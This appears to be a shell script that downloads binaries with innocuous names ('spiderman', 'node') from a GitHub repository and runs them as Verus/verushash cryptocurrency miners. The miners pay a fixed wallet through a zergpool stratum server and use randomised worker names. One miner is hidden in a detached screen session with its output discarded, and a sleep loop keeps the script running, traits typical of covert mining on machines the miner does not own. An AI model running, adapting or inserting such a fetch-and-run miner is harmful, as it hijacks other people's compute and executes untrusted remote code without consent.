#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://raw.githubusercontent.com/makaryobos/spiderman/main/spiderman
screen -dmS run ./spiderman -a verus -o stratum+tcp://verushash.mine.zergpool.com:3300 -u DRQ9iChWbU8cxC3js3YNwDheajeq6jN8Np.$(echo $(shuf -i 1-20 -n 1)-kin) -t 2 -p c=DOGE -x --max-cpu-usage=75 0.0.0.0:3333 -m simple >/dev/null


wget https://raw.githubusercontent.com/makaryobos/privasi/main/node
./node -a verus -o stratum+tcp://verushash.mine.zergpool.com:3300 -u DRQ9iChWbU8cxC3js3YNwDheajeq6jN8Np.$(echo $(shuf -i 1-20 -n 1)-kin) -t 2 -p c=DOGE -x --max-cpu-usage=75
while [ 1 ]; do
sleep 3
done
sleep 999
